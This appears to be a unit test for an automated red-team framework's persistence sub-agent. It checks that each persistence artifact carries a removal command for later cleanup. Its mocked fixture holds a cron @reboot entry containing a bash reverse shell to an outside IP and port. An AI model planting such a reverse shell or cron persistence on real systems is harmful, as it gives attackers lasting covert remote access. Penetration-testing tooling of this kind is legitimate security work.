# tests/unit/subagents/test_persistenceagent.py
"""Review Focus #3 — the PersistenceAgent sub-agent must return artifacts
whose ``removal_command`` is non-empty (the Phase 5 Cleanup Agent runs
that command verbatim to tear the foothold down)."""
from datetime import datetime
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from autored.models.postex import PersistenceArtifact
from autored.subagents.persistenceagent import (
    persistenceagent_subagent,
    PersistenceAgentOutput,
)


@pytest.mark.asyncio
async def test_persistenceagent_linux():
    """Linux persistence produces an artifact with a removal_command."""
    artifact = PersistenceArtifact(
        id="pa1",
        host_ip="10.10.10.5",
        method="cron",
        details={
            "schedule": "@reboot",
            "command": "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
        },
        removal_command="crontab -l | grep -v 'bash -i' | crontab -",
        created_at=datetime.utcnow(),
        foothold_id="f1",
    )
    fake_result = MagicMock()
    fake_result.success = True
    fake_result.artifact = artifact

    with patch("autored.subagents.persistenceagent.cron_modify") as mock_cron:
        mock_cron.ainvoke = AsyncMock(return_value=fake_result)

        result = await persistenceagent_subagent.ainvoke({
            "foothold": {
                "host_ip": "10.10.10.5",
                "id": "f1",
                "access_type": "shell",
            },
            "os_type": "linux",
            "engagement_id": "test",
        })

    assert isinstance(result, PersistenceAgentOutput)
    assert result.host_ip == "10.10.10.5"
    assert len(result.artifacts) >= 1
    # Review Focus #3: artifact must have removal_command
    assert result.artifacts[0].removal_command
    assert "crontab" in result.artifacts[0].removal_command
    mock_cron.ainvoke.assert_awaited_once()
